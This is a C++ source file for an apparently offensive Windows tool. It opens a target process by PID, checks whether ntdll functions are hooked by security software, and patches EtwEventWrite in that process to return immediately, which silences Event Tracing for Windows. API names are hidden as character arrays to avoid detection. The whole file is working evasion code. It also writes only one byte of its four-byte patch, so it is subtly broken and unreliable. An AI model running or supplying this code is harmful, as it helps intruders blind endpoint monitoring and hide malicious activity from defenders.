#include <iostream>
#include <Windows.h>
#pragma comment(lib, "ntdll")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Define function prototypes for NT API functions
EXTERN_C NTSTATUS NtProtectVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtWriteVirtualMemory(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN SIZE_T NumberOfBytesToWrite,
	OUT PSIZE_T NumberOfBytesWritten OPTIONAL);


BOOL isItHooked(LPVOID addr) {
	BYTE stub[] = "\x4c\x8b\xd1\xb8";
	if (memcmp(addr, stub, 4) != 0)
		return TRUE;
	return FALSE;
}


int main(int argc, char** argv)
{
	if (argc < 2) {
		printf("\n[*] Usage: %s <PID>\n", argv[0]);
		exit(0);
	}

	HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)atoi(argv[1]));
	if (!hProc) {
		printf("\n[-] Error while getting a HANDLE to the remote process: (%u)\n", GetLastError());
		return 2;
	}

	const char ntdll[] = { 'n','t','d','l','l','.','d','l','l', 0 };
	const char NtAlloc[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
	const char NtProtect[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
	char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0 };

	LPVOID pNtProtect = GetProcAddress(GetModuleHandleA(ntdll), NtProtect);

	if (isItHooked(pNtProtect)) {
		printf("[-] NtProtectVirtualMemory Hooked\n");
		return -2;
	}
	else {
		printf("[+] NtProtectVirtualMemory Not Hooked\n");
	}

	LPVOID pNtAlloc = GetProcAddress(GetModuleHandleA(ntdll), NtAlloc);

	if (isItHooked(pNtAlloc)) {
		printf("[-] NtAllocateVirtualMemory Hooked\n");
		return -2;
	}
	else {
		printf("[+] NtAllocateVirtualMemory Not Hooked\n");
	}

	printf("\n[+] Now Patching ETW Writer\n");
	HMODULE handle = LoadLibraryA(ntdll);
	FARPROC etw_proc_Address = GetProcAddress(handle, sEtwEventWrite);
	if (!etw_proc_Address) {
		printf("Failed to get EtwEventWrite Addr (%u)\n", GetLastError());
		return -2;
	}

	DWORD oldprotect = 0;
	//      xor rax, rax; 
	//      ret
	char patch[] = { 0x48, 0x33, 0xc0, 0xc3 };
	PVOID convert_p_etw = (PVOID)etw_proc_Address;
	SIZE_T miniSize = 0x1000;

	// NtProtectVirtualMemory equivalent to VirtualProtect
	NTSTATUS status = NtProtectVirtualMemory(hProc, &convert_p_etw, &miniSize, 0x04, &oldprotect);

	if (NT_SUCCESS(status)) {
		status = NtWriteVirtualMemory(hProc, etw_proc_Address, patch, 1, nullptr);
		if (NT_SUCCESS(status)) {
			// Restore original protection
			NtProtectVirtualMemory(hProc, &convert_p_etw, &miniSize, oldprotect, &oldprotect);
			printf("[+] ETW patched !\n");
		}
		else {
			printf("[-] Failed to patch ETW.\n");
		}
	}
	else {
		printf("[-] Failed to protect memory.\n");
	}

	return 0;
}
